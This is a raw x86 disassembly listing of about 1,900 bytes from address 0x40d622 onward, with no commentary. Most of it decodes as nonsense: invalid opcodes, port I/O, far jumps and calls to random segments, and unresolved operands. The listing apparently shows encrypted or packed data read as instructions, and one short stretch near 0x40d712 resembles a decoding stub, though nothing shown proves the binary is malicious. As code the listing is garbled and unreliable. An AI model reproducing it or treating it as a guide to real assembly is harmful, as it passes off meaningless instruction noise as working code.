  40d622:	jnp    0x40d60d
  40d624:	jp     0x40d60d
  40d626:	aaa    
  40d627:	cmovbe esi,DWORD PTR [ecx]
  40d62a:	inc    edi
  40d62b:	push   ds
  40d62c:	aas    
  40d62d:	test   BYTE PTR [ecx+0x6b],dh
  40d630:	(bad)  
  40d631:	in     eax,dx
  40d632:	jae    0x40d639
  40d634:	add    al,0xb1
  40d636:	call   FWORD PTR [ebx+0x1a]
  40d639:	inc    BYTE PTR [edi-0x2c]
  40d63c:	mov    DWORD PTR [ecx],edx
  40d63e:	test   BYTE PTR [edx+0x3c],bh
  40d641:	popa   
  40d642:	das    
  40d643:	mov    ebp,0x4e2ecca5
  40d648:	outs   dx,DWORD PTR ds:[esi]
  40d649:	or     al,0x80
  40d64b:	jbe    0x40d6a8
  40d64d:	int3   
  40d64e:	mov    ds:0xc109f7b6,al
  40d653:	test   BYTE PTR [ecx-0x59],ah
  40d656:	stos   DWORD PTR es:[edi],eax
  40d657:	jne    0x40d616
  40d659:	into   
  40d65a:	out    0x9e,al
  40d65c:	cmp    DWORD PTR ds:0xf9264e74,edx
  40d662:	in     eax,0xac
  40d664:	aaa    
  40d665:	out    dx,al
  40d666:	cwde   
  40d667:	test   DWORD PTR [ebx-0x5add0005],0x3ebf7195
  40d671:	push   eax
  40d672:	push   ds
  40d673:	pop    ecx
  40d674:	je     0x40d67e
  40d676:	lock jle 0x40d6ce
  40d679:	xor    DWORD PTR [esi],ebx
  40d67b:	test   al,0xcd
  40d67d:	add    ch,BYTE PTR [edx+0x12ea88a7]
  40d683:	(bad)
  40d686:	mov    al,ds:0xb3c33cc8
  40d68b:	jge    0x40d636
  40d68d:	les    ebx,FWORD PTR [eax]
  40d68f:	out    0x3c,al
  40d691:	imul   edi,esp,0xffffff81
  40d694:	xchg   ebx,eax
  40d695:	addr16 xchg ecx,eax
  40d697:	punpckldq mm7,DWORD PTR [ebx+edi*1-0x228de044]
  40d69f:	out    0x55,eax
  40d6a1:	(bad)  
  40d6a3:	es aam 0x8c
  40d6a6:	push   ebp
  40d6a7:	lea    esi,[edi+0x35c32d8a]
  40d6ad:	dec    ebp
  40d6ae:	xor    al,0x5d
  40d6b0:	(bad)  
  40d6b1:	sbb    esi,DWORD PTR [ecx+0x2f]
  40d6b4:	outs   dx,DWORD PTR ds:[esi]
  40d6b5:	(bad)
  40d6b8:	mov    al,0xef
  40d6ba:	stc    
  40d6bb:	aaa    
  40d6bc:	stc    
  40d6bd:	and    al,ah
  40d6bf:	xchg   BYTE PTR [eax+0x52],ah
  40d6c2:	(bad)  
  40d6c3:	pop    edi
  40d6c4:	clc    
  40d6c5:	scas   eax,DWORD PTR es:[edi]
  40d6c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6c7:	sbb    bl,ch
  40d6c9:	inc    edx
  40d6ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6cb:	fnstsw WORD PTR [eax]
  40d6cd:	in     al,dx
  40d6ce:	std    
  40d6cf:	cmp    dl,al
  40d6d1:	ret    0x605d
  40d6d4:	mov    esp,0x4fa665ab
  40d6d9:	mov    ds:0xb9df20e3,eax
  40d6de:	jae    0x40d710
  40d6e0:	sahf   
  40d6e1:	jb     0x40d755
  40d6e3:	jge    0x40d6e9
  40d6e5:	jg     0x40d712
  40d6e7:	call   0x5555a82
  40d6ec:	or     dh,cl
  40d6ee:	test   ah,al
  40d6f0:	std    
  40d6f1:	push   0x3d
  40d6f3:	pop    edx
  40d6f4:	pushf  
  40d6f5:	pop    ebp
  40d6f6:	add    dh,BYTE PTR [ebx]
  40d6f8:	ror    DWORD PTR [ebx-0x7372f7b3],1
  40d6fe:	or     bl,BYTE PTR [ebp+0x3b003272]
  40d704:	enter  0x850f,0x1e
  40d708:	cli    
  40d709:	(bad)  
  40d70a:	dec    DWORD PTR [ebx+0x5e9de]
  40d710:	add    BYTE PTR [eax],al
  40d712:	mov    ebx,0x32729d
  40d717:	mov    eax,DWORD PTR [ebp-0x4]
  40d71a:	xor    eax,0x7510856
  40d71f:	add    eax,ebx
  40d721:	mov    DWORD PTR [ebp-0xc],eax
  40d724:	xor    ebx,ebx
  40d726:	lea    eax,[ebp-0x10]
  40d729:	add    ebx,DWORD PTR [eax]
  40d72b:	jmp    0x40d889
  40d730:	xchg   ebp,eax
  40d731:	pop    es
  40d732:	mov    ds:0xa5aabdfe,eax
  40d737:	cmp    eax,0xb6db83b1
  40d73c:	fcmovnbe st,st(7)
  40d73e:	cmp    DWORD PTR [ebp+0x1],eax
  40d741:	cmp    BYTE PTR [esi+0x7e],0x3f
  40d745:	jg     0x40d7c5
  40d747:	jle    0x40d6d1
  40d749:	cli    
  40d74a:	mov    eax,DWORD PTR ds:0xbf493fdb
  40d750:	mov    BYTE PTR [ebx],0x83
  40d753:	clc    
  40d754:	dec    ebp
  40d755:	imul   DWORD PTR [edi]
  40d757:	jmp    0xeb6e:0x4d4dad0c
  40d75e:	mov    bh,0xa7
  40d760:	push   edi
  40d761:	iret   
  40d762:	popa   
  40d763:	cli    
  40d764:	xchg   esp,eax
  40d765:	add    ebx,DWORD PTR ds:0xbdb22a83
  40d76b:	pop    ecx
  40d76c:	hlt    
  40d76d:	mov    BYTE PTR [ecx],al
  40d76f:	fadd   st(4),st
  40d771:	mov    ebp,0x8c6cadaa
  40d776:	scas   al,BYTE PTR es:[edi]
  40d777:	scas   al,BYTE PTR es:[edi]
  40d778:	dec    BYTE PTR [esi+esi*4]
  40d77b:	sbb    DWORD PTR [edi],ebx
  40d77d:	lods   eax,DWORD PTR ds:[esi]
  40d77e:	mov    ebx,0xc1b868fb
  40d783:	mov    ah,0x7d
  40d785:	jae    0x40d7f4
  40d787:	sti    
  40d788:	adc    eax,0xd06bb6d7
  40d78d:	cwde   
  40d78e:	pop    ss
  40d78f:	cmp    BYTE PTR [edx+0x35],0xea
  40d793:	cmc    
  40d794:	adc    bh,BYTE PTR [esi]
  40d796:	push   ecx
  40d797:	dec    ecx
  40d798:	jmp    0xd7dc7e50
  40d79d:	jno    0x40d809
  40d79f:	scas   eax,DWORD PTR es:[edi]
  40d7a0:	ret    
  40d7a1:	mov    eax,0x258decc4
  40d7a6:	lods   eax,DWORD PTR ds:[esi]
  40d7a7:	pop    ebp
  40d7a8:	adc    edi,edx
  40d7aa:	jno    0x40d7b2
  40d7ac:	fs mov ecx,0x3ae94c36
  40d7b2:	adc    ch,BYTE PTR [edx+eax*2]
  40d7b5:	xor    dl,bh
  40d7b7:	(bad)  
  40d7b8:	mov    WORD PTR [ebp+0x41],ds
  40d7bb:	inc    ebp
  40d7bc:	push   ebp
  40d7bd:	(bad)  [eax-0x4d]
  40d7c0:	daa    
  40d7c1:	sub    edx,DWORD PTR [eax-0x68]
  40d7c4:	daa    
  40d7c5:	push   0xffffffaa
  40d7c7:	add    DWORD PTR [ebx],0xbc6cf75f
  40d7cd:	pop    ebx
  40d7ce:	inc    ebx
  40d7cf:	cdq    
  40d7d0:	jmp    0xa88c9cf7
  40d7d5:	outs   dx,BYTE PTR ds:[esi]
  40d7d6:	test   BYTE PTR [edx+0x4115abe4],ah
  40d7dc:	jg     0x40d7b0
  40d7de:	or     BYTE PTR [edi+0x401e190b],dh
  40d7e4:	push   edi
  40d7e5:	xor    BYTE PTR [eax+ebp*1],dl
  40d7e8:	lods   eax,DWORD PTR ds:[esi]
  40d7e9:	adc    dl,al
  40d7eb:	test   BYTE PTR [edi],dl
  40d7ed:	xchg   ecx,eax
  40d7ee:	je     0x40d7b3
  40d7f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7f1:	inc    ebx
  40d7f2:	loopne 0x40d834
  40d7f4:	inc    esp
  40d7f5:	add    DWORD PTR [edi-0x6d],ebp
  40d7f8:	push   ds
  40d7f9:	jmp    0x881:0xf45ef369
  40d800:	in     al,0x7d
  40d802:	loopne 0x40d79a
  40d804:	xor    ecx,eax
  40d806:	loopne 0x40d79e
  40d808:	sbb    eax,0xa46d7d64
  40d80d:	shl    BYTE PTR gs:[edi+0x2f8d3413],1
  40d814:	mov    ecx,0x84aa7a6f
  40d819:	jecxz  0x40d876
  40d81b:	stc    
  40d81c:	dec    esi
  40d81d:	fdivr  DWORD PTR ds:0x7ff28771
  40d823:	push   0x56
  40d825:	pop    es
  40d826:	dec    ebx
  40d827:	sub    bl,bl
  40d829:	mov    esp,0x170bc28c
  40d82e:	cmp    eax,0x8a7c85f4
  40d833:	scas   al,BYTE PTR es:[edi]
  40d834:	sub    BYTE PTR [ebx],cl
  40d836:	mov    cl,0xfa
  40d838:	sbb    dh,BYTE PTR [edi-0x4d0724cf]
  40d83e:	mov    al,ds:0xbc38f1f1
  40d843:	dec    eax
  40d844:	sub    al,0xd2
  40d846:	add    al,0x36
  40d848:	jne    0x40d7ea
  40d84a:	test   al,0x5c
  40d84c:	rcr    BYTE PTR [eax+0x697ed537],1
  40d852:	jmp    0x826fd22e
  40d857:	adc    dl,al
  40d859:	xchg   edi,eax
  40d85a:	aas    
  40d85b:	jg     0x40d7fc
  40d85d:	push   0xdcd1c450
  40d862:	hlt    
  40d863:	jl     0x40d864
  40d865:	mov    edi,0xe494bad6
  40d86a:	outs   dx,BYTE PTR ds:[esi]
  40d86b:	adc    al,BYTE PTR [ebp-0x562087a9]
  40d871:	xchg   ecx,eax
  40d872:	and    eax,0x1f91c764
  40d877:	and    al,0x96
  40d879:	mov    dh,0xb4
  40d87b:	call   0x2cde:0x65ce67b6
  40d882:	fwait
  40d883:	call   0xff6d:0xeffca760
  40d88a:	shl    DWORD PTR [ebx],cl
  40d88c:	fucomi st,st(1)
  40d88e:	pop    ecx
  40d88f:	add    DWORD PTR [eax],eax
  40d891:	add    dh,dh
  40d893:	arpl   WORD PTR [ebp+esi*2+0x7d97c57d],dx
  40d89a:	imul   eax,DWORD PTR [edx],0x51
  40d89d:	mov    esi,DWORD PTR [ecx+0x74]
  40d8a0:	mov    ebp,esi
  40d8a2:	ret    0x7e81
  40d8a5:	jle    0x40d8e6
  40d8a7:	jg     0x40d927
  40d8a9:	jle    0x40d851
  40d8ab:	dec    esi
  40d8ac:	retf   0x1f81
  40d8af:	aaa    
  40d8b0:	cmp    BYTE PTR [edx-0x6abf3d2d],ah
  40d8b6:	mov    edi,ebp
  40d8b8:	mov    ecx,0x5661f7d3
  40d8bd:	popf   
  40d8be:	jae    0x40d8d3
  40d8c0:	ja     0x40d85c
  40d8c2:	lock fisub DWORD PTR [ebp-0x58700467]
  40d8c9:	sbb    eax,0xc8454ff5
  40d8ce:	(bad)  
  40d8cf:	into   
  40d8d0:	xor    ah,BYTE PTR [eax-0x41fcf6b5]
  40d8d6:	pop    ecx
  40d8d7:	cli    
  40d8d8:	or     DWORD PTR [ebp+0x26ae4a34],esi
  40d8de:	add    ebp,DWORD PTR [edi+0x2e]
  40d8e1:	cmp    al,0x32
  40d8e3:	js     0x40d868
  40d8e5:	dec    esi
  40d8e6:	dec    ecx
  40d8e7:	inc    edx
  40d8e9:	jmp    0x3301:0xc1e0637
  40d8f0:	adc    bh,BYTE PTR [ebp+0x71]
  40d8f3:	or     edi,eax
  40d8f5:	call   0x820:0xd74cbccc
  40d8fc:	sub    eax,0x98b78306
  40d901:	std    
  40d902:	push   edx
  40d903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d904:	test   DWORD PTR [edi],eax
  40d906:	mov    dl,0x19
  40d908:	add    ah,BYTE PTR [ebx+esi*1-0x4f67dab1]
  40d90f:	mov    eax,0x49180faf
  40d914:	arpl   WORD PTR [ebp+0x36],di
  40d917:	xchg   edi,eax
  40d918:	mov    ebx,0x86f97676
  40d91d:	arpl   WORD PTR [ecx+0xe],dx
  40d920:	xchg   esp,eax
  40d921:	mov    ds:0xb084ded2,al
  40d926:	faddp  st(3),st
  40d928:	mov    WORD PTR [ecx],?
  40d92a:	sbb    dh,BYTE PTR [edx-0x30]
  40d92d:	push   ds
  40d92e:	fwait
  40d92f:	es cdq 
  40d931:	outs   dx,DWORD PTR ds:[esi]
  40d932:	retf   0xab04
  40d935:	mov    dh,dh
  40d937:	dec    eax
  40d938:	inc    ecx
  40d939:	adc    DWORD PTR [ebx+0x47],edi
  40d93c:	sbb    edx,eax
  40d93e:	jge    0x40d9b3
  40d940:	push   esi
  40d941:	fisub  DWORD PTR [edi]
  40d943:	ins    DWORD PTR es:[edi],dx
  40d944:	push   edx
  40d945:	sub    bh,BYTE PTR [edi+0x5a]
  40d948:	les    ebp,FWORD PTR [edx-0x4a]
  40d94b:	lods   al,BYTE PTR ds:[esi]
  40d94d:	(bad)  
  40d94e:	leave  
  40d94f:	jnp    0x40d96e
  40d951:	xchg   ebx,eax
  40d952:	aam    0x62
  40d954:	scas   eax,DWORD PTR es:[edi]
  40d955:	push   eax
  40d956:	pop    edi
  40d957:	cli    
  40d958:	lock xchg BYTE PTR [ebp-0x13b5fde1],al
  40d95f:	mov    edi,0x17aff3a9
  40d964:	sbb    eax,0x7b4b3438
  40d969:	mov    bl,0x78
  40d96b:	addr16 dec ebx
  40d96d:	icebp  
  40d96e:	stos   DWORD PTR es:[edi],eax
  40d96f:	rcr    DWORD PTR [ecx+0x4b],1
  40d972:	inc    edi
  40d973:	mov    dl,0x14
  40d975:	fidivr WORD PTR [ecx-0xe]
  40d978:	mov    ds:0xd677c693,al
  40d97d:	or     esp,ebx
  40d97f:	ss test bh,bl
  40d982:	in     eax,dx
  40d983:	in     al,dx
  40d984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d985:	outs   dx,DWORD PTR ds:[esi]
  40d986:	cmc    
  40d987:	rcl    bh,cl
  40d989:	push   esp
  40d98a:	inc    esi
  40d98b:	mov    DWORD PTR [ecx-0xf],esi
  40d98e:	cmp    eax,0x9596a001
  40d993:	call   DWORD PTR [edx]
  40d995:	mov    ds:0x6449cbf0,eax
  40d99a:	jno    0x40d9e4
  40d99c:	cmp    eax,0x4b63c533
  40d9a1:	pusha  
  40d9a2:	fld    TBYTE PTR [esi+0x54d55a7f]
  40d9a8:	mov    esi,0x3e5c6609
  40d9ad:	aad    0xae
  40d9af:	xchg   ebp,eax
  40d9b0:	mov    ebx,0x3dd62309
  40d9b5:	data16 sbb al,0x2d
  40d9b8:	rcr    BYTE PTR [eax+eiz*2+0x16c10db5],0xca
  40d9c0:	push   ebx
  40d9c1:	cli    
  40d9c2:	stos   DWORD PTR es:[edi],eax
  40d9c3:	mov    eax,ds:0xc8578d78
  40d9c8:	jb     0x40da3f
  40d9ca:	iret   
  40d9cb:	fadd   DWORD PTR [ebx-0x16]
  40d9ce:	sti    
  40d9cf:	sub    eax,0x637af3d7
  40d9d4:	dec    DWORD PTR [ebp-0x8]
  40d9d7:	test   eax,0xcb249b38
  40d9dc:	or     eax,0x4179fd9a
  40d9e1:	cmp    ah,BYTE PTR [ecx+0x19c36d3e]
  40d9e7:	sub    cl,bl
  40d9e9:	mov    dh,0x76
  40d9eb:	inc    ebx
  40d9ec:	jmp    0x40db4a
  40d9f1:	jae    0x40d9e7
  40d9f3:	aas    
  40d9f4:	mov    DWORD PTR [ecx-0x6573b2b3],esi
  40d9fa:	cmp    BYTE PTR [edx+0x77],bl
  40d9fd:	push   0x83d510dd
  40da02:	cmp    BYTE PTR [esi+0x7e],0x3f
  40da06:	jg     0x40da86
  40da08:	jle    0x40da2b
  40da0a:	shl    BYTE PTR [ebx],1
  40da0c:	(bad)  [esi+0x51bf5b64]
  40da12:	retf   
  40da13:	add    dh,BYTE PTR [ebx+eax*1+0x7c]
  40da17:	fs add bh,ah
  40da1a:	iret   
  40da1b:	jne    0x40da06
  40da1d:	in     al,0x90
  40da1f:	pushf  
  40da20:	mov    ecx,0xa81e6ceb
  40da25:	lea    eax,[esp+ecx*8]
  40da28:	ret    
  40da29:	xchg   edx,eax
  40da2a:	aad    0x48
  40da2c:	inc    ebx
  40da2d:	pop    ebx
  40da2f:	push   esi
  40da30:	daa    
  40da31:	cmp    eax,0x8ef2f82e
  40da36:	pop    ebx
  40da37:	mov    ah,0x5a
  40da39:	aaa    
  40da3a:	xor    BYTE PTR [edi-0x64],dl
  40da3d:	jle    0x40da34
  40da3f:	(bad)  
  40da40:	sbb    al,0xb5
  40da42:	repnz and BYTE PTR [ecx],cl
  40da45:	xor    eax,0xfe6fb25
  40da4a:	cmp    ch,bh
  40da4c:	sub    BYTE PTR ss:[ebx-0x43],dh
  40da50:	adc    al,0xdd
  40da52:	mov    esi,0x1a127919
  40da57:	xchg   ecx,eax
  40da58:	int    0x75
  40da5a:	jg     0x40d9de
  40da5c:	icebp  
  40da5d:	xor    eax,0xadd2043c
  40da62:	(bad)  
  40da63:	hlt    
  40da64:	cli    
  40da65:	leave  
  40da66:	inc    ebp
  40da67:	adc    BYTE PTR [ebx+0x14],al
  40da6a:	daa    
  40da6b:	ja     0x40da7f
  40da6d:	jo     0x40da54
  40da6f:	xor    eax,0xebda3a1c
  40da74:	dec    ebp
  40da75:	retf   
  40da76:	add    BYTE PTR [eax-0x15],cl
  40da79:	cli    
  40da7a:	std    
  40da7b:	xchg   edx,eax
  40da7c:	fucomi st,st(5)
  40da7e:	fdivr  QWORD PTR [esi+0x75ccfea]
  40da84:	in     eax,0x3f
  40da86:	test   DWORD PTR [edx+0x2d0c5777],esp
  40da8c:	mov    cl,0xa9
  40da8e:	das    
  40da8f:	cmp    al,0x43
  40da91:	jne    0x40dadb
  40da93:	das    
  40da94:	sbb    eax,0x99edd948
  40da99:	dec    edx
  40da9a:	cwde   
  40da9b:	xchg   esp,eax
  40da9c:	pop    es
  40da9d:	pop    eax
  40da9e:	repnz sbb al,0x3b
  40daa1:	adc    esi,edi
  40daa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daa4:	jmp    0xf929:0x213a3d35
  40daab:	dec    ecx
  40daac:	or     eax,0x762b11da
  40dab1:	push   0x610381f9
  40dab6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dab7:	sar    BYTE PTR ds:0x21b2bb62,cl
  40dabd:	add    ch,BYTE PTR [edx-0xca6d988]
  40dac3:	sar    DWORD PTR [ebx+0x23],1
  40dac6:	sub    DWORD PTR [eax+0x46c3f46d],0x387604e0
  40dad0:	jb     0x40db39
  40dad2:	mov    bh,0x67
  40dad4:	rcr    BYTE PTR [ebx+0x59],0xdb
  40dad8:	jmp    0xe1243779
  40dadd:	pop    ecx
  40dade:	adc    eax,0x1d16befb
  40dae3:	(bad)  
  40dae4:	pop    edi
  40dae5:	sbb    eax,0xf16fc78
  40daea:	shr    BYTE PTR [ebp+ecx*8+0x73485285],1
  40daf1:	mov    ecx,0x3981c647
  40daf6:	mov    dl,0x40
  40daf8:	jmp    0x74de816d
  40dafd:	dec    esp
  40dafe:	sbb    eax,0x6f1b5793
  40db03:	push   ecx
  40db04:	cwde   
  40db05:	xchg   DWORD PTR [ecx-0x66],edi
  40db08:	arpl   WORD PTR [esi+eax*2+0x43],ax
  40db0c:	repz scas al,BYTE PTR es:[edi]
  40db0e:	rcl    BYTE PTR [ebx],0xd4
  40db11:	mov    ?,WORD PTR [edi+0x59e36e5d]
  40db17:	test   eax,0x3c7d7c31
  40db1c:	test   BYTE PTR [eax-0x18],ch
  40db1f:	push   ebx
  40db20:	ds jnp 0x40db70
  40db23:	pop    esi
  40db24:	adc    ch,BYTE PTR [edx+0x70]
  40db27:	inc    edx
  40db28:	and    BYTE PTR [ebp-0x6d],0x66
  40db2c:	mov    cl,0x65
  40db2e:	jnp    0x40db1d
  40db30:	add    al,0x59
  40db32:	pop    ebp
  40db33:	outs   dx,DWORD PTR ds:[esi]
  40db34:	ja     0x40db8a
  40db36:	push   ss
  40db37:	xor    dl,0x68
  40db3a:	call   0xc7d8:0x1ed12ab7
  40db41:	pop    ebp
  40db42:	add    bh,dl
  40db44:	and    edi,DWORD PTR [eax+0x11]
  40db47:	scas   al,BYTE PTR es:[edi]
  40db48:	fild   WORD PTR [edi+0xf105d39]
  40db4e:	test   BYTE PTR [edx],dh
  40db50:	add    al,0x0
  40db52:	add    cl,ch
  40db54:	pop    ecx
  40db55:	add    DWORD PTR [eax],eax
  40db57:	add    BYTE PTR [ebp-0x54e36178],dl
  40db5d:	cmp    al,0xbd
  40db5f:	mov    ecx,0xd105ab5
  40db64:	push   ebp
  40db65:	add    al,0x5e
  40db67:	inc    ebx
  40db68:	inc    esp
  40db69:	cmp    DWORD PTR [esi+0x7e],0x3f
  40db6d:	jg     0x40dbed
  40db6f:	jle    0x40dbbf
  40db71:	gs mov ecx,esp
  40db74:	rol    BYTE PTR ds:0x22604fbd,1
  40db7a:	ss sbb esi,edi
  40db7d:	shl    eax,0xd1
  40db80:	shl    BYTE PTR [ecx+edx*1+0x5ef7d91f],cl
  40db87:	pop    gs
  40db89:	sub    bh,ch
  40db8b:	in     eax,0x2e
  40db8d:	test   eax,0x758fe58b
  40db92:	sahf   
  40db93:	push   es
  40db94:	je     0x40db6f
  40db96:	mov    edi,0xacf2e4a7
  40db9b:	ret    
  40db9c:	mov    ebp,0x592c85d
  40dba1:	mov    ch,0x37
  40dba3:	idiv   BYTE PTR [edx+0x75931562]
  40dba9:	xor    eax,0xaf632711
  40dbaf:	test   BYTE PTR [esp+ebx*4-0x7a],bl
  40dbb3:	mov    bl,0x5a
  40dbb5:	inc    edx
  40dbb6:	jno    0x40db9c
  40dbb8:	cli    
  40dbb9:	iret   
  40dbba:	hlt    
  40dbbb:	mov    DWORD PTR [ebx+0x6e1fc737],edi
  40dbc1:	push   edx
  40dbc2:	lea    esp,[edi]
  40dbc4:	ins    DWORD PTR es:[edi],dx
  40dbc5:	retf   0xfffd
  40dbc8:	outs   dx,BYTE PTR ds:[esi]
  40dbc9:	les    ebp,FWORD PTR [esi+0x7d33b252]
  40dbcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbd0:	int3   
  40dbd1:	pop    eax
  40dbd2:	mov    edx,0x287e2b50
  40dbd7:	stos   DWORD PTR es:[edi],eax
  40dbd8:	out    0x8d,al
  40dbda:	xchg   edx,eax
  40dbdb:	out    dx,al
  40dbdc:	das    
  40dbdd:	fs xchg edi,eax
  40dbdf:	push   eax
  40dbe0:	retf   
  40dbe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbe2:	test   eax,0xedff5a33
  40dbe7:	mov    eax,0x190bd9ed
  40dbec:	frstor [eax-0x35]
  40dbef:	in     al,dx
  40dbf0:	add    BYTE PTR [ebp+0x8],0x1a
  40dbf4:	sar    BYTE PTR [edx+ebp*1],cl
  40dbf7:	ds shl ebx,cl
  40dbfa:	xor    ch,ch
  40dbfc:	(bad)  
  40dbfd:	inc    bl
  40dbff:	sub    edi,DWORD PTR [edi+0x2df67d2b]
  40dc05:	mov    BYTE PTR [edi+0x48d2d22],ch
  40dc0b:	cmp    eax,0x5a013733
  40dc10:	or     eax,0xffe768f4
  40dc15:	popf   
  40dc16:	mov    BYTE PTR [esi+0x33],al
  40dc19:	ss cwde 
  40dc1b:	pop    esp
  40dc1c:	add    BYTE PTR ss:[ebx+0x4489d654],dl
  40dc23:	enter  0x46d5,0x3
  40dc27:	xchg   ebx,eax
  40dc28:	(bad)  
  40dc29:	popf   
  40dc2a:	lods   al,BYTE PTR ds:[esi]
  40dc2b:	stc    
  40dc2c:	inc    esp
  40dc2d:	rcr    BYTE PTR [ecx-0x54],cl
  40dc30:	mov    eax,0xce520afe
  40dc35:	std    
  40dc36:	das    
  40dc37:	ss jbe 0x40dc0f
  40dc3a:	sub    eax,0x8683113e
  40dc3f:	inc    esi
  40dc40:	mov    ebp,0xaebb4458
  40dc45:	dec    edi
  40dc46:	je     0x40dc7b
  40dc48:	pop    eax
  40dc49:	pushf  
  40dc4a:	pop    eax
  40dc4b:	or     bh,dh
  40dc4d:	retf   0x7e26
  40dc50:	sub    eax,0xfcd56338
  40dc55:	enter  0x7200,0x28
  40dc59:	in     al,0xa1
  40dc5b:	xchg   DWORD PTR [edx+0x2d],edx
  40dc5e:	xor    edi,DWORD PTR [ecx]
  40dc60:	je     0x40dc7a
  40dc62:	daa    
  40dc63:	sahf   
  40dc64:	mov    cl,0xd4
  40dc66:	scas   eax,DWORD PTR es:[edi]
  40dc67:	sub    al,BYTE PTR [esi-0x35c8eb3]
  40dc6d:	xor    al,0xc7
  40dc6f:	jb     0x40dca5
  40dc71:	retf   0x55d0
  40dc74:	xor    ecx,DWORD PTR [ebx+0x28]
  40dc77:	cmp    ah,bh
  40dc79:	xor    DWORD PTR [edx],ebx
  40dc7b:	inc    eax
  40dc7c:	cmp    eax,0x6b50b151
  40dc81:	mov    esp,0x6809b7bd
  40dc86:	pop    ebx
  40dc87:	enter  0xbf75,0xff
  40dc8b:	push   eax
  40dc8c:	scas   al,BYTE PTR es:[edi]
  40dc8d:	fs in  eax,dx
  40dc8f:	add    BYTE PTR [ebp-0xf840fcc],dl
  40dc95:	cmp    eax,0x7ae000b7
  40dc9a:	mov    ecx,0xf03f335e
  40dc9f:	dec    edx
  40dca0:	pop    esi
  40dca1:	push   esp
  40dca2:	mov    BYTE PTR [ebp+0x2668aae8],ah
  40dca8:	jmp    0x40dc82
  40dcaa:	fsub   QWORD PTR [edi+0x63]
  40dcad:	ins    BYTE PTR es:[edi],dx
  40dcae:	lock fistp QWORD PTR [ecx+0x159e992]
  40dcb5:	add    BYTE PTR [eax],al
  40dcb7:	dec    eax
  40dcb8:	adc    eax,0xdc7bcafb
  40dcbd:	jns    0x40dc54
  40dcbf:	rcl    BYTE PTR ds:0xe45e3fe9,cl
  40dcc5:	fwait
  40dcc6:	dec    eax
  40dcc7:	add    eax,0x3f7e7e85
  40dccc:	jg     0x40dd4c
  40dcce:	jle    0x40dd48
  40dcd0:	mov    eax,0x9e96e196
  40dcd5:	mov    BYTE PTR [ecx-0x107909db],0x89
  40dcdc:	aad    0x42
  40dcde:	xor    al,0x2a
  40dce0:	in     eax,dx
  40dce1:	push   0x9131fbf3
  40dce6:	nop
  40dce7:	pop    ecx
  40dce8:	shr    ch,cl
  40dcea:	mov    al,0xa8
  40dcec:	inc    eax
  40dced:	cmp    eax,0x378d629c
  40dcf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcf3:	mov    ah,0x25
  40dcf5:	sahf   
  40dcf6:	shr    DWORD PTR [ebx-0x51d1d67c],0x4c
  40dcfd:	pop    eax
  40dcfe:	push   esi
  40dcff:	pushf  
  40dd00:	mov    esp,0xafcc569a
  40dd05:	jae    0x40dd51
  40dd07:	ret    
  40dd08:	cmp    ebx,DWORD PTR [eax-0xba96438]
  40dd0e:	add    esi,ebx
  40dd10:	xchg   esi,eax
  40dd11:	mov    esi,0x2ad4afc4
  40dd16:	(bad)  
  40dd17:	out    0x56,al
  40dd19:	lods   eax,DWORD PTR ds:[esi]
  40dd1a:	std    
  40dd1b:	aam    0x19
  40dd1d:	hlt    
  40dd1e:	cmp    eax,0xf85856fc
  40dd23:	mov    esp,0xdc731eab
  40dd28:	adc    eax,0xd1227f3a
  40dd2d:	call   0x82569343
  40dd32:	jbe    0x40dd07
  40dd34:	push   ss
  40dd35:	mov    eax,0xfd430bce
  40dd3a:	hlt    
  40dd3b:	loopne 0x40ddac
  40dd3d:	mov    ch,0xd
  40dd3f:	sbb    edx,DWORD PTR [ecx]
  40dd41:	dec    eax
  40dd42:	lea    ebx,[ebp+0x30ccc34c]
  40dd48:	cmc    
  40dd49:	sbb    al,0x50
  40dd4b:	dec    bx
  40dd4d:	js     0x40dda9
  40dd4f:	xlat   BYTE PTR ds:[ebx]
  40dd50:	pusha  
  40dd51:	pop    ebp
  40dd52:	sar    DWORD PTR [edi],cl
  40dd54:	xchg   edi,eax
  40dd55:	popf   
  40dd56:	fiadd  DWORD PTR [eax-0x4e]
  40dd59:	cli    
  40dd5a:	aas    
  40dd5b:	dec    edx
  40dd5c:	mov    ebx,0xb44e85fc
  40dd61:	pop    eax
  40dd62:	or     cl,0xc6
  40dd65:	sub    edi,ecx
  40dd67:	inc    esp
  40dd68:	stos   DWORD PTR es:[edi],eax
  40dd69:	xor    BYTE PTR [ebx-0x47],bl
  40dd6c:	neg    DWORD PTR [ebp+0x33]
  40dd6f:	scas   al,BYTE PTR es:[edi]
  40dd70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd71:	aad    0x4c
  40dd73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd74:	add    al,0xb5
  40dd76:	popa   
  40dd77:	jne    0x40dd82
  40dd79:	xor    bl,ch
  40dd7b:	daa    
  40dd7c:	in     eax,0x96
  40dd7e:	push   0xffffff9e
  40dd80:	stos   DWORD PTR es:[edi],eax
  40dd81:	pop    edi
  40dd82:	sub    esi,DWORD PTR ds:0xe2fb6fe
  40dd88:	lds    ecx,FWORD PTR [esi-0x6a2ce64]
  40dd8e:	shr    DWORD PTR [ebp+0x6],1
  40dd91:	mov    gs,WORD PTR [ebp+ebp*2-0x353e7f3f]
  40dd98:	shr    DWORD PTR [edi+0x7c],1
  40dd9b:	stc    
  40dd9c:	cwde   
  40dd9d:	imul   ebp,DWORD PTR [edx+0x6b],0x23b882ab
  40dda4:	lock pop ebx
  40dda6:	sub    BYTE PTR [ebx-0x23],dh
  40dda9:	ins    BYTE PTR es:[edi],dx
  40ddaa:	pop    ebx
  40ddab:	or     al,0xa5
  40ddad:	and    DWORD PTR [eax+eiz*1],esi
  40ddb0:	sub    esi,ebp
  40ddb2:	inc    edx
  40ddb3:	pop    esi
  40ddb4:	mov    esp,0xf4cff78a
  40ddb9:	mov    dl,0xf3
  40ddbb:	inc    ebp
  40ddbc:	pop    es
  40ddbd:	jns    0x40dd6f
